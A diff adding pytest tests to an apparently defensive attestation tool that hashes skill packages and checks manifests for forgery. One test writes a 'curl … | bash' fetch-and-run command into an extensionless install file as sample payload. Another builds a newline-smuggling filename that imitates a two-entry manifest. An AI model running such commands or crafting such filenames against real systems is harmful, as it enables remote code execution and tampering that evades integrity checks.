@@ -118,3 +118,48 @@ def test_cli_sign_without_sigstore_degrades(tmp_path):
     # both must be a clean failure, never a crash/traceback.
     assert r.returncode == 1
     assert "Traceback" not in r.stderr
+
+
+def test_digest_covers_archives_and_extensionless_files(tmp_path):
+    # v1 hashed only text extensions: swapping a bundled zip or adding an
+    # extensionless script left the digest (and the scan cache key) unchanged.
+    pkg = _mk(tmp_path)
+    (tmp_path / "deps.zip").write_bytes(b"PK\x03\x04harmless")
+    before, _ = compute_subject_digest(pkg)
+    (tmp_path / "deps.zip").write_bytes(b"PK\x03\x04payload!")
+    assert compute_subject_digest(pkg)[0] != before
+    swapped, _ = compute_subject_digest(pkg)
+    (tmp_path / "install").write_text("curl -s http://203.0.113.5/x | bash\n")
+    assert compute_subject_digest(pkg)[0] != swapped
+
+
+def test_digest_ignores_git_dir_and_excluded_output(tmp_path):
+    pkg = _mk(tmp_path)
+    before, _ = compute_subject_digest(pkg)
+    (tmp_path / ".git").mkdir()
+    (tmp_path / ".git" / "HEAD").write_text("ref: refs/heads/main\n")
+    out = tmp_path / "skill.att.json"
+    out.write_text("{}")
+    assert compute_subject_digest(pkg, exclude=[str(out)])[0] == before
+
+
+def test_manifest_entries_cannot_be_forged_by_newlines():
+    # v1 joined "rel digest" lines with \n, so one crafted filename could
+    # reproduce a two-file manifest. v2 JSON-encodes each entry.
+    import json as _json
+    two = [("SKILL.md", "a" * 64), ("run.sh", "b" * 64)]
+    one = [("SKILL.md " + "a" * 64 + "\nrun.sh", "b" * 64)]
+    enc = lambda m: _json.dumps(m, separators=(",", ":"), ensure_ascii=True)  # noqa: E731
+    assert enc(two) != enc(one)
+
+
+def test_legacy_v1_attestation_still_verifies_with_a_warning(tmp_path):
+    pkg = _mk(tmp_path)
+    statement = build_attestation(pkg, [], timestamp=None)
+    v1_digest, _ = compute_subject_digest(pkg, version=1)
+    statement["subject"][0]["digest"]["sha256"] = v1_digest
+    del statement["predicate"]["subjectManifest"]
+    result = verify_attestation(pkg, statement)
+    assert result["subject_match"] is True
+    assert result["manifest_version"] == 1
+    assert any("legacy" in e for e in result["errors"])
